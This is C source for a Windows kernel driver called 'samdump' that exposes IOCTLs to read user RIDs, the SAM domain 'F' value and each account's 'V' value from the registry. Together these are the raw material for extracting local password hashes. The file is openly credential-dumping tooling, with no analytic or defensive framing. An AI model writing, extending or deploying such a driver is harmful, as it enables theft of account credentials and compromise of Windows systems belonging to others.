#include "samdump.h"


	
VOID unload(PDRIVER_OBJECT pDriverObject)
{ 
	//must destroy objects !
	UNICODE_STRING NomLien;
	RtlInitUnicodeString(&NomLien,L"\\DosDevices\\samdump");
	
	IoDeleteSymbolicLink(&NomLien);
	if(pDriverObject!=NULL)
		IoDeleteDevice(pDriverObject->DeviceObject);
	
    DbgPrint(" [ -SAM DUMP- ] Driver unloaded.\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
    UNICODE_STRING NomInterface,NomLien;
	PDEVICE_OBJECT ptrInterface;
	
	DbgPrint(" [ -SAM DUMP- ] Driver loaded.\n");

    RtlInitUnicodeString(&NomInterface,L"\\Device\\samdump");
 
    IoCreateDevice(pDriverObject,0,&NomInterface,FILE_DEVICE_UNKNOWN,FILE_DEVICE_UNKNOWN,FALSE,&ptrInterface);
    pDriverObject->DriverUnload = unload;
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = Fonction_IRP_MJ_CREATE;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = Fonction_IRP_MJ_CLOSE;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Fonction_IRP_DEVICE_CONTROL;

    RtlInitUnicodeString(&NomLien,L"\\DosDevices\\samdump");
    IoCreateSymbolicLink(&NomLien,&NomInterface);

    return STATUS_SUCCESS;
	
}

NTSTATUS Fonction_IRP_MJ_CREATE(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
    return STATUS_SUCCESS;
}

NTSTATUS Fonction_IRP_MJ_CLOSE(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
    return STATUS_SUCCESS;
}

NTSTATUS Fonction_IRP_DEVICE_CONTROL(PDEVICE_OBJECT DeviceObject,PIRP Irp)
{
    PIO_STACK_LOCATION pIoStackLocation;
    PVOID pBuf = Irp->AssociatedIrp.SystemBuffer;
    PEPROCESS ptrStructProcessToHide;
    long pid, Output_Size, ret;
    int retour;
	ULONG retfunc;
	
	PWSTR Output_Buffer =  Irp->AssociatedIrp.SystemBuffer;
    pIoStackLocation = IoGetCurrentIrpStackLocation(Irp);
	Output_Size  =  pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength;

    switch(pIoStackLocation->Parameters.DeviceIoControl.IoControlCode)
    {
            case IOCTL_RETRIEVE_RID :
				RtlZeroMemory(Output_Buffer, Output_Size);
				retrieveRID(Output_Buffer, Output_Size);
				Irp->IoStatus.Information = Output_Size;
                break;
			 case IOCTL_RETRIEVE_F_BYTES :
				RtlZeroMemory(Output_Buffer, Output_Size);
				ret=retrieveSpecificValue((PUCHAR)Output_Buffer, 0, Output_Size, L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account", L"F");
				Irp->IoStatus.Information = ret;
                break;
			 case IOCTL_RETRIEVE_RID_V_BYTES :
				ret=retrieveSpecificValue((PUCHAR)Output_Buffer, 0, Output_Size, (PWSTR)Output_Buffer, L"V");
				Irp->IoStatus.Information = ret;
                break;
			default:
				break;
    }
	
    // Finish the I/O operation by simply completing the packet and returning
    // the same status as in the packet itself.
    Irp->IoStatus.Status = STATUS_SUCCESS;

    IoCompleteRequest(Irp,IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}
